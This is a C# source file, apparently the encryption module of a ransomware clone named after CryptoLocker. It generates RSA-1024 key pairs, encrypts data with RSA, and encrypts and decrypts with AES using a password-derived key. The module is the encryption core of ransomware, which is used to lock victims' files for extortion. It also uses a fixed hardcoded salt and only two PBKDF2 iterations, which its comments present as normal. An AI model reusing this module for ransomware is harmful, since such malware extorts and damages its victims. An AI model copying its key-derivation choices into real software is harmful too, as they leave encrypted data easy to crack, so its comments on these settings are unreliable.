using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace CryptoLocker.WinForm
{
    /// <summary>
    /// http://www.codeproject.com/Articles/769741/Csharp-AES-bits-Encryption-Library-with-Salt
    /// http://www.bleepingcomputer.com/virus-removal/cryptolocker-ransomware-information
    /// </summary>
    public class Cryptography
    {
        const string SaltValue = "s@1tValue";             // Any string at least 8 bytes
        const int PasswordIterations = 2;                 // Can be any number, usually 1 or 2       
        const int KeySize = 256;                          // Allowed values: 192, 128 or 256
        const int BlockSize = 128;

        public static CryptoKey CreateKeyPair()
        {
            CspParameters cspParameters = new CspParameters { ProviderType = 1 };
            RSACryptoServiceProvider rsaProvider = new RSACryptoServiceProvider(1024, cspParameters);

            string publicKey = Convert.ToBase64String(rsaProvider.ExportCspBlob(false));
            string publicAndPrivateKey = Convert.ToBase64String(rsaProvider.ExportCspBlob(true));

            return new CryptoKey(publicAndPrivateKey, publicKey);
        }
        
        /// <summary>
        /// Encrypts small amounts of data asymmetrically. The data length must be
        /// shorter than the key length, og you will get a 'Bad Length' exception.
        /// </summary>
        public static byte[] RsaEncrypt(string publicKey, string data)
        {
            CspParameters cspParams = new CspParameters { ProviderType = 1 };
            RSACryptoServiceProvider rsaProvider = new RSACryptoServiceProvider(cspParams);

            rsaProvider.ImportCspBlob(Convert.FromBase64String(publicKey));

            byte[] plainBytes = Encoding.UTF8.GetBytes(data);
            byte[] encryptedBytes = rsaProvider.Encrypt(plainBytes, false);

            return encryptedBytes;
        }

        public static string RsaDecrypt(string privateKey, byte[] encryptedBytes)
        {
            CspParameters cspParams = new CspParameters { ProviderType = 1 };
            RSACryptoServiceProvider rsaProvider = new RSACryptoServiceProvider(cspParams);

            rsaProvider.ImportCspBlob(Convert.FromBase64String(privateKey));

            byte[] plainBytes = rsaProvider.Decrypt(encryptedBytes, false);

            string plainText = Encoding.UTF8.GetString(plainBytes, 0, plainBytes.Length);
            return plainText;
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes(SaltValue);

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged aes = new RijndaelManaged())
                {
                    aes.KeySize = KeySize;
                    aes.BlockSize = BlockSize;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, PasswordIterations);
                    aes.Key = key.GetBytes(aes.KeySize / 8);
                    aes.IV = key.GetBytes(aes.BlockSize / 8);

                    aes.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }

                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = Encoding.UTF8.GetBytes(SaltValue);

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = KeySize;
                    AES.BlockSize = BlockSize;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, PasswordIterations);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }

            return decryptedBytes;
        }
    }
}